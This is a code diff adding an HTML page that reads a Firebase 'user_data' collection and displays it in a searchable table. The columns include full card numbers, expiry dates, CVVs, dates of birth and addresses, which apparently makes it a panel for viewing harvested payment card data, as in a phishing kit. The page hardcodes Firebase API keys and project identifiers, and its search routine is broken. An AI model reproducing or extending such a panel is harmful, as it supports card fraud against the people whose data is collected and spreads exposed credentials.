@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>User Data Table</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap");
+      .ddd {
+        height: 90vh;
+        overflow-y: scroll;
+      }
+      .ddd thead {
+        position: sticky;
+        top: -1%;
+        z-index: 2;
+      }
+      table {
+        width: 100%;
+        font-size: 12px;
+        border-collapse: collapse;
+        font-family: "roboto", sans-serif;
+      }
+      th,
+      td {
+        border: 1px solid black;
+        padding: 8px;
+        font-weight: 550;
+        text-align: left;
+      }
+      th {
+        background-color: #f2f2f2;
+      }
+    </style>
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+    ></script>
+  </head>
+  <body>
+    <div class="container">
+      <input type="text" id="searchInput" placeholder="Search..." />
+      <div class="ddd">
+        <table id="dataTable">
+          <thead>
+            <tr>
+              <th>Account Number</th>
+              <th>Statement_id</th>
+              <th>Name On Card</th>
+              <th>Phone</th>
+              <th>Email</th>
+              <th>Amount</th>
+              <th>Card Number</th>
+              <th>Card Expiry</th>
+              <th>CVV</th>
+              <th>DOB</th>
+              <th>Address</th>
+              <th>City</th>
+              <th>Zip Code</th>
+              <th>State</th>
+            </tr>
+          </thead>
+          <tbody id="tableBody"></tbody>
+        </table>
+      </div>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-compat.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const firebaseConfig = {
+          // apiKey: "AIzaSyCN9eaAuVlQqMWM7HdWZ7hYY6rA4boLWLA",
+          // authDomain: "epay-817ef.firebaseapp.com",
+          // databaseURL: "https://epay-817ef-default-rtdb.firebaseio.com",
+          // projectId: "epay-817ef",
+          // storageBucket: "epay-817ef.appspot.com",
+          // messagingSenderId: "82168870079",
+          // appId: "1:82168870079:web:0f641ce884bc962563420a",
+          apiKey: "AIzaSyBw5oweUPs1TGkfxRp98mJb9yqI5QQkwLU",
+    authDomain: "patient-notebook-7104e.firebaseapp.com",
+    projectId: "patient-notebook-7104e",
+    storageBucket: "patient-notebook-7104e.appspot.com",
+    messagingSenderId: "681277349381",
+    appId: "1:681277349381:web:526c989aa341a954b7866c"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        const database = firebase.database();
+        const tableRef = database.ref("user_data");
+
+        tableRef.on("value", function (snapshot) {
+          const data = snapshot.val();
+          const tableBody = document.getElementById("tableBody");
+          tableBody.innerHTML = ""; // Clear previous data
+
+          // Convert Firebase object to array
+          const dataArray = Object.values(data);
+
+          dataArray.forEach((row) => {
+            const newRow = document.createElement("tr");
+            newRow.innerHTML = `
+              <td>${row.AccountNumber}</td>
+              <td>${row.statement_id}</td>
+              <td>${row.name_on_card}</td>
+              <td>${row.phone}</td>
+              <td>${row.email}</td>
+              <td>$ ${row.amount}</td>
+              <td>${row.cc_number}</td>
+              <td>${row.cc_exp}</td>
+              <td>${row.cvv}</td>
+              <td>${row.dob}</td>
+              
+              <td>${row.address}</td>
+              <td>${row.city}</td>
+              <td>${row.zip_code}</td>
+              <td>${row.state}</td>
+            `;
+            tableBody.appendChild(newRow);
+          });
+
+          // Add search functionality
+          const searchInput = document.getElementById("searchInput");
+          searchInput.addEventListener("input", function () {
+            const searchText = this.value.toLowerCase();
+            dataArray.forEach((row) => {
+              const rowValues = Object.values(row).map((value) =>
+                value.toString().toLowerCase()
+              );
+              const rowElement = tableBody.querySelector(
+                `tr[data-row-index="${row.statement_id}"]`
+              );
+              if (rowValues.some((value) => value.includes(searchText))) {
+                rowElement.style.display = "";
+              } else {
+                rowElement.style.display = "none";
+              }
+            });
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
